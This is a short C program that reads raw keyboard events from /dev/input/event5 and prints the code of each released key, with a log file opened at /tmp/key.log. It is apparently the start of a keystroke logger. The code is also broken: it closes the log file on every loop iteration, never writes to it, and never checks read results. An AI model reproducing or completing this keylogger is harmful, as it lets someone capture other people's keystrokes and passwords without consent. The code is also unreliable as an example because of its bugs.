#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <linux/input.h>

int main()
{
	struct input_event ev;
	int fd = open("/dev/input/event5", O_RDONLY);
	printf("%d\n", fd);
	FILE *log = fopen("/tmp/key.log", "a");
	while (1) {
		//printf("Started\n");
		read(fd, &ev, sizeof(ev));
		fflush(stdout);
		fclose(log);

		
		if (ev.type == EV_KEY && ev.value == 0)
			printf("%d\t", ev.code);
		//printf("End\n");
	}
	return EXIT_SUCCESS;
}
